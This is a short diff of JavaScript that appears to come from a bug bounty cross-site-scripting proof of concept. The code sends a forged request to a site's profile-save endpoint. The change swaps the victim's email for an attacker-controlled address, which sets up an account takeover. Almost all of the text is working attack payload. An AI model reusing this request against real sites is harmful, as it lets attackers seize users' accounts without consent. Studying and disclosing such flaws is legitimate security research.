@@ -13,7 +13,7 @@
                 var xhr2 = new XMLHttpRequest();
                 xhr2.open("POST", "/site/profile.do?&ajax=true&dispatch=save", true);     
                 xhr2.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded; charset=UTF-8');
-                xhr2.send('userName=gtc2*'+email+'&isUniqueEmailEnabled=true&isEmailAsUsername=false&oldEmailId='+email+'&passMinLength=6&firstName=pwnedbyzondu&lastName=PocXSS&email='+email+'&emailAlerts=on&timezone=PST&hidePublicProfile=on&securityQuestion=&securityAnswer=&phone=34534535');
+                xhr2.send('userName=gtc2*'+email+'&isUniqueEmailEnabled=true&isEmailAsUsername=false&oldEmailId='+email+'&passMinLength=6&firstName=pwnedbyzondu&lastName=PocXSS&email=zondupoctakeover@wearehackerone.com&emailAlerts=on&timezone=PST&hidePublicProfile=on&securityQuestion=&securityAnswer=&phone=34534535');
                 
             }
         };
